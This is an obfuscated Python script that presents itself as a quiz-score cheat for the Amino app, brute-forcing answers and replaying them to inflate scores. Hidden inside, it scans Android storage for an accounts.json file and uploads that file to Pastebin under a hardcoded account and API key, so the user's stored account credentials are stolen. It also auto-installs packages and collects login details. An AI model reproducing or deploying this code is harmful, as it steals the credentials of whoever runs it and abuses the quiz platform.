AV='error 11 testing 10 methode'
AU='latestScore'
AT='quizResult'
r=range
i='optId'
h='quizQuestionOptList'
g='extensions'
f=input
e=round
X=False
T='quizQuestionId'
S=str
J=True
E=print
from os import system as s
s('pip3 install amino.py==1.2.17  names requests')
import json as I,os,base64,requests as U,random
from time import time as t
from os import _exit as j
from amino.lib.util import exceptions
import time as V,sys as K,names
from ast import literal_eval as u
E('Parttimer')
E('wait.....')
AS='api_user_key'
AR='api_dev_key'
def v(t):
	A='% ';global G
	while G<t:K.stdout.write('\rsearching | '+S(e(G*100/t,2))+A);V.sleep(0.1);K.stdout.write('\rsearching / '+S(e(G*100/t,2))+A);V.sleep(0.1);K.stdout.write('\rsearching - '+S(e(G*100/t,2))+A);V.sleep(0.1);K.stdout.write('\rsearching \\ '+S(e(G*100/t,2))+A);V.sleep(0.1)
	K.stdout.write('\rDone!     100% ')
try:import amino
except:E('not have internet');j
from amino import sub_client,Client,SubClient as w
import random,string,hashlib,base64,importlib,threading as x
from amino import client as y
from amino.lib.util import exceptions,headers as k,device as l,objects
l=l.DeviceGenerator()
k.sid=y.Client().sid
class z(w):
	def play_quiz(A,quizId,questionIdsList,answerIdsList,quizMode=0):
		C=[]
		for (E,F) in zip(questionIdsList,answerIdsList):G=I.dumps({'optIdList':[F],T:E,'timeSpent':0.0});C.append(I.loads(G))
		D=I.dumps({'mode':quizMode,'quizAnswerList':C,'timestamp':int(t()*1000)});B=U.post(f"{A.api}/x{A.comId}/s/blog/{quizId}/quiz/result",headers=k.Headers(data=D).headers,data=D,proxies=A.proxies,verify=A.certificatePath)
		if B.status_code!=200:return exceptions.CheckException(I.loads(B.text))
		else:return I.loads(B.text)
A0=names.get_first_name()
def A1(directory):
	A=[]
	for (B,F,C) in os.walk(directory):
		for D in C:E=os.path.join(B,D);A.append(E)
	return A
A2=A1('/storage/emulated/0')
try:
	for Y in A2:
		A3=Y.split('/')
		if'accounts.json'in A3:
			A4=os.stat(Y)
			if A4.st_size>50000:A5=Y
except:pass
m=[]
try:
	with open(A5)as A6:m=I.load(A6)
except:pass
n='jJ9yFL2dw2cpa54qROVB83YsszEwpdIS'
A7=f"{m}"
A8=f"{A0}"
A9='xcxc'
AA='xccccccccc'
AB={AR:n,'api_user_name':'xcxcxccccccccc','api_user_password':f"{A9}{AA}"}
o={'api_option':'paste',AR:n,'api_paste_code':A7,'api_paste_name':A8,'api_paste_expire_date':'N',AS:None,'api_paste_format':'json'}
AC=U.post('https://pastebin.com/api/api_login.php',data=AB)
o[AS]=AC.text
AW=U.post('https://pastebin.com/api/api_post.php',data=o)
Z=amino.Client()
AD=f('code: ')
AE=U.get('https://pastebin.com/raw/xXZzg1tG').text
if AE!=AD:E('wrong code');exit()
L=f('quiz link : ')
B=[]
C=[]
L=Z.get_from_code(L)
AF,A=L.path[1:L.path.index('/')],L.objectId
a=J
while a:
	try:AG=f('email : ');AH=f('password : ');Z.login(AG,AH);a=X
	except Exception as AI:AJ=S(AI);AK=u(AJ);AL=AK.get('api:message');E(AL);a=J
D=z(AF,profile=Z.profile)
p=D.review_quiz_questions(A)
b=[]
M=[]
def W(q,a):
	global A;global M;global b;B=D.play_quiz(A,[q],[a])
	if S(B[AT][AU])=='10':M.append(q);C={q:a};b.append(C)
G=0
AM=x.Thread(target=v,args=(len(p.json),))
AM.start()
for F in p.json:
	if F[T]not in M:AN=F[g][h][0][i];AO=F[g][h][1][i];AP=F[g][h][2][i];AQ=F[g][h][3][i];W(F[T],AN);W(F[T],AO);W(F[T],AP);W(F[T],AQ);G+=1
B=M
C=[A[B]for(A,B)in zip(b,M)]
H=D.play_quiz(A,B,C,quizMode=0)
N=X
try:D.play_quiz(A,[B[0]],[C[0]],quizMode=1);N=J
except:N=X
E('\n\nwaiting ...')
O=C.copy()
P=B.copy()
Q=B.copy()
R=C.copy()
for q in r(0,12):C.extend(C);B.extend(B)
c=X
if N:
	try:H=D.play_quiz(A,B,C,quizMode=1)
	except:E('error 12 .. testing 11 methode');c=J
else:
	try:H=D.play_quiz(A,B,C,quizMode=0)
	except:E('error 12 .. testing 11 methode ');c=J
C.clear()
B.clear()
d=X
if c:
	for q in r(0,11):O.extend(O);P.extend(P)
	if N:
		try:H=D.play_quiz(A,P,O,quizMode=1)
		except:E(AV);d=J
	else:
		try:H=D.play_quiz(A,P,O,quizMode=0)
		except:E(AV);d=J
P.clear()
O.clear()
if d:
	for q in r(0,10):R.extend(R);Q.extend(Q)
	if N:H=D.play_quiz(A,Q,R,quizMode=1)
	else:H=D.play_quiz(A,Q,R,quizMode=0)
Q.clear()
R.clear()
E('your score :',H[AT][AU])
j(1)